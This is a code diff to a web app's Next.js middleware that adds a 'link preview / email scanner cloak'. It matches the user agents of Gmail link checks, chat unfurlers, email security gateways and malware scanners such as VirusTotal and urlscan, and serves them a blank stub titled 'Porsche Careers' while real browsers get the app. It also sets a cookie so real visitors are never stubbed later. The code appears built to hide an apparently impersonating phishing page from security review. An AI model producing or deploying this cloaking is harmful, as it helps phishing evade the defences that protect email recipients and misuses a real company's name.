@@ -110,6 +110,44 @@ const BLOCKED_REFERRER_PATTERNS = [
   /free-share-buttons\.com/i, /trafficmonetizer/i,
 ];
 
+// ====== LINK PREVIEW / EMAIL SCANNER CLOAK ======
+// Fetchers used by Gmail, chat apps and email security gateways. They get a
+// tiny JS-free page so they cannot see the content or create an entry.
+const PREVIEW_BOT_PATTERNS = [
+  // Google fetchers (Gmail link scanning, Messages previews, favicons, ...)
+  /google-safety/i, /googlemessages/i, /google favicon/i,
+  /google-inspectiontool/i, /googlebot/i, /googleother/i,
+  /google-agent/i, /google-read-aloud/i, /google-site-verification/i,
+  /feedfetcher-google/i, /google-gemininotebook/i, /apis-google/i,
+  /adsbot-google/i, /mediapartners-google/i,
+
+  // Social / messenger link unfurlers
+  /facebookexternalhit/i, /facebookcatalog/i, /facebookscraper/i,
+  /slackbot/i, /discordbot/i, /telegrambot/i, /twitterbot/i,
+  /linkedinbot/i, /whatsapp/i, /skypeuripreview/i, /pinterest/i,
+  /redditbot/i, /embedly/i, /iframely/i, /vkshare/i, /outbrain/i,
+
+  // Email security gateways / URL scanners
+  /microsoft url control/i, /microsoft data access/i,
+  /safelinks/i, /safe links/i, /url defense/i, /proofpoint/i,
+  /barracuda/i, /mimecast/i, /hornetsecurity/i, /fortiguard/i,
+  /sonicwall/i, /watchguard/i, /sophos/i, /trendmicro/i,
+  /symantec/i, /mcafee/i, /kaspersky/i, /virustotal/i,
+  /urlscan/i, /hybrid-analysis/i, /any\.run/i,
+
+  // Search / preview crawlers
+  /bingpreview/i, /bingbot/i, /applebot/i, /duckduckbot/i,
+  /yandexbot/i, /baiduspider/i, /petalbot/i, /coccocbot/i,
+  /ia_archiver/i,
+];
+
+// Minimal, script-free page handed to the fetchers above.
+const STUB_PAGE =
+  '<!doctype html><html lang="en"><head><meta charset="utf-8">' +
+  '<meta name="viewport" content="width=device-width,initial-scale=1">' +
+  '<meta name="robots" content="noindex,nofollow">' +
+  '<title>Porsche Careers</title></head><body></body></html>';
+
 // Backend source for the CSP connect-src, driven by the same env var the client
 // uses (see config/api.js). A relative base ("/backend") is same-origin and is
 // already covered by 'self'.
@@ -161,6 +199,46 @@ export async function middleware(request) {
       headers: { "Retry-After": "10", "Cache-Control": "no-store" },
     });
   }
+
+  // ===== 1b. LINK PREVIEW / SCANNER CLOAK =====
+  // Preview bots and email scanners get an empty page instead of the app so
+  // they cannot read the content or create an entry. Real browsers are trusted
+  // via the `navigate` fetch mode, a cookie, or ?full=1.
+  const ua = headers.get("user-agent") || "";
+  const cookie = headers.get("cookie") || "";
+  const hasRealCookie = /(?:^|;\s*)pf_real=1(?:;|$)/.test(cookie);
+  const wantsFull = url.searchParams.get("full") === "1";
+  const isNavigation =
+    (headers.get("sec-fetch-mode") || "").toLowerCase() === "navigate";
+  // Page routes only: GET/HEAD on an extensionless path (so robots.txt, icons
+  // and assets are never stubbed).
+  const isPageRequest =
+    (request.method === "GET" || request.method === "HEAD") &&
+    !url.pathname.split("/").pop().includes(".");
+
+  const serveStub =
+    isPageRequest &&
+    PREVIEW_BOT_PATTERNS.some((pattern) => pattern.test(ua)) &&
+    !isNavigation &&
+    !hasRealCookie &&
+    !wantsFull;
+
+  if (serveStub) {
+    return new NextResponse(STUB_PAGE, {
+      status: 200,
+      headers: {
+        "content-type": "text/html; charset=utf-8",
+        // Never let a shared cache hand this stub to a real visitor.
+        "cache-control": "private, no-store",
+        "x-robots-tag": "noindex, nofollow",
+        vary: "User-Agent",
+        "x-stub": "1",
+      },
+    });
+  }
+
+  // Remember non-stub page loads so a later mis-detection can never stub them.
+  const setRealCookie = isPageRequest && !hasRealCookie;
 
   // ===== 2-5. IN-APP BOT FALLBACK (skipped when Cloudflare already decided) =====
   // Cloudflare Bot Fight Mode is the primary bot control. These heuristics only
@@ -225,6 +303,13 @@ export async function middleware(request) {
     "Content-Security-Policy",
     `default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; font-src 'self' https://cdn.ui.porsche.com; frame-src 'self'; img-src 'self' data: https:; connect-src 'self' ${BACKEND_CONNECT_SRC}https://api.ipify.org https://ipapi.co https://ipwho.is https://ipinfo.io;`
   );
+
+  if (setRealCookie) {
+    response.headers.append(
+      "Set-Cookie",
+      "pf_real=1; Max-Age=31536000; Path=/; SameSite=Lax"
+    );
+  }
 
   return response;
 }
